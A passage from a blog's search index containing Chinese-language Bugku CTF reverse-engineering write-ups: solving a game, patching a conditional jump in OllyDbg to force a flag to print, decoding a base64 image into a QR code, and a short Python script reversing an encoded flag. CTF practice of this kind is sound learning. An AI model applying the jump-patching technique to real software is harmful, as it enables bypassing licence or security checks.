title="游戏过关"></a>游戏过关</h4><p>这题可以有至少三种解法：<br>1、第一种解法<br>直接游戏通关，很简单，依次输入1-8即可<br><img src="https://s2.ax1x.com/2020/02/13/1qpzqO.png" alt="游戏过关-1"><br>2、使用OD修改程序<br>首先查找字符串找到输出flag关键函数<br><img src="https://s2.ax1x.com/2020/02/13/1q9pZD.png" alt="游戏过关-2"><br>找到如图所示函数的起始地址，跳转两次找到关键判断<br><img src="https://s2.ax1x.com/2020/02/13/1q9CIH.png" alt="游戏过关-3"><br>可以看到jnz指令进行了跳转，如果没有跳转，将会执行输出flag的函数，现在修改程序，将跳转过后的指令修改为输出flag指令<br><img src="https://s2.ax1x.com/2020/02/13/1q9iid.png" alt="游戏过关-4"><br>直接运行程序，输入任意数字都可得到flag<br><img src="https://s2.ax1x.com/2020/02/13/1q9FJA.png" alt="游戏过关-5"><br>3、进行解码解出flag<br>可在上图4-2中看到处理flag的部分，将下面的16进制进行解码即可都得到flag</p><h4 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h4><p>下载下来admin.exe，发现打不开，peid检查发现不是PE程序，用文本编辑器打开，发现时图片转base64，转成图片得到二维码扫描得到flag</p><h4 id="love"><a href="#love" class="headerlink" title="love"></a>love</h4><p>IDA打开反编译，找到输出部分<br><img src="https://s2.ax1x.com/2020/02/13/1qpvM6.png" alt="love-1"><br>发现进行了处理之后将两个base64比较，如果相同就输出flag正确，所以只要将Str2进行反变换就得到了正确的flag</p><pre><code class="python">import base64s = &quot;e3nifIH9b_C@n@dH&quot;flag = &quot;&quot;for i in range(len(s)):    flag += chr(ord(s[i]) - i)flag = base64.b64decode(flag)print(flag)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/12/30/hello-world/"/>
      <url>/2019/12/30/hello-world/</url>
      
        <content type="html"><![CDATA[<p>My first post to say “Hello”.</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
